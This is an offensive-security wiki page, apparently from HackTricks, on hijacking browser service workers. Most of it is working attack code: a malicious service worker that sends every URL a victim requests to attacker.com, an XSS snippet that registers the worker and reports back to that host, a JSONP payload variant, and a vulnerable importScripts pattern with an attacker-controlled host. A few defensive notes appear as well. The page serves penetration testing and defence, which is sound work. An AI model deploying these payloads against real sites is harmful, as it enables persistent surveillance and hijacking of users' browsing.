# Abusing Service Workers

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

A **service worker** is a script run by your browser in the background, separate from any web page, enabling features that don't require a web page or user interaction, thus enhancing **offline and background processing** capabilities. Detailed information on service workers can be found [here](https://developers.google.com/web/fundamentals/primers/service-workers). By exploiting service workers within a vulnerable web domain, attackers can gain control over the victim's interactions with all pages within that domain.<sup>[[2]](#references)</sup>

### Checking for Existing Service Workers

Existing service workers can be inspected, updated, stopped, or unregistered from the **Service Workers** section of Chrome DevTools' **Application** panel. Chromium also exposes `chrome://serviceworker-internals` for a global, lower-level view of registrations.<sup>[[3]](#references)[[7]](#references)</sup>

### Push Notifications

**Push notification permissions** directly impact a **service worker's** ability to communicate with the server without direct user interaction. If permissions are denied, it limits the service worker's potential to pose a continuous threat. Conversely, granting permissions increases security risks by enabling the reception and execution of potential exploits.

## Attack Creating a Service Worker

In order to exploit this vulnerability you need to find:

- A way to **upload arbitrary JS** files to the server and a **XSS to load the service worker** of the uploaded JS file
- A **vulnerable JSONP request** where you can **manipulate the output (with arbitrary JS code)** and a **XSS** to **load the JSONP with a payload** that will **load a malicious service worker**.

The following service worker listens for `fetch` events and sends each requested URL to the attacker's server. This is the code that must be uploaded to the vulnerable origin or returned through a vulnerable JSONP endpoint:

```javascript
self.addEventListener("fetch", (event) => {
  event.waitUntil(
    fetch("https://attacker.com/fetch_url/" + encodeURIComponent(event.request.url), {
      mode: "no-cors",
    }).catch(() => {}),
  )
  event.respondWith(caches.match(event.request).then((response) => response || fetch(event.request)))
})
```

And this is the code that will **register the worker** (the code you should be able to execute abusing a **XSS**). In this case a **GET** request will be sent to the **attackers** server **notifying** if the **registration** of the service worker was successful or not:

```html
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
  .then(function(registration) {
    var xhttp2 = new XMLHttpRequest();
    xhttp2.open("GET", "https://attacker.com/SW/success", true);
    xhttp2.send();
  }, function (err) {
    var xhttp2 = new XMLHttpRequest();
    xhttp2.open("GET", "https://attacker.com/SW/error", true);
    xhttp2.send();
  });
});
</script>
```

In case of abusing a vulnerable JSONP endpoint you should put the value inside `var sw`. For example:

```javascript
var sw =
  "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//"
```

**Shadow Workers** is a command-and-control framework dedicated to service-worker exploitation.<sup>[[4]](#references)</sup>

Service-worker update checks bypass the browser cache when the previous fetch occurred more than 24 hours ago, but that does **not** guarantee that a malicious worker disappears within 24 hours: the old worker can remain active until a changed script is fetched, installed, and activated. Use short cache lifetimes for the worker script and deploy a kill-switch worker that unregisters itself and clears malicious caches.<sup>[[5]](#references)[[6]](#references)</sup>

## Abusing `importScripts` in a SW via DOM Clobbering

The function **`importScripts`** called from a Service Worker can **import a script from a different domain**. If this function is called using a **parameter that an attacker could** modify he would be able to **import a JS script from his domain** and get XSS.<sup>[[1]](#references)</sup>

**This even bypasses CSP protections.**

**Example vulnerable code:**

- **index.html**

```html
<script>
  navigator.serviceWorker.register(
    "/dom-invader/testcases/augmented-dom-import-scripts/sw.js" +
      location.search
  )
  // attacker controls location.search
</script>
```

- **sw.js**

```javascript
const searchParams = new URLSearchParams(location.search)
let host = searchParams.get("host")
self.importScripts(host + "/sw_extra.js")
//host can be controllable by an attacker
```

### With DOM Clobbering

For more info about what DOM Clobbering is check:


{{#ref}}
dom-clobbering.md
{{#endref}}

If the URL/domain where that the SW is using to call **`importScripts`** is **inside a HTML element**, it's **possible to modify it via DOM Clobbering** to make the SW **load a script from your own domain**.<sup>[[1]](#references)</sup>

For an example of this check the reference link.<sup>[[1]](#references)</sup>

## References

- [1] [Hijacking service workers via DOM Clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
- [2] [developers.google.com - Primers - Service Workers](https://developers.google.com/web/fundamentals/primers/service-workers)
- [3] [Chrome DevTools - Application panel overview](https://developer.chrome.com/docs/devtools/application)
- [4] [Shadow Workers](https://shadow-workers.github.io)
- [5] [MDN - `ServiceWorkerRegistration.update()`](https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorkerRegistration/update)
- [6] [Service-worker kill-switch pattern](https://stackoverflow.com/a/38980776)
- [7] [Chromium - Service Worker Security FAQ](https://chromium.googlesource.com/chromium/src/+/main/docs/security/service-worker-security-faq.md)

{{#include ../../banners/hacktricks-training.md}}
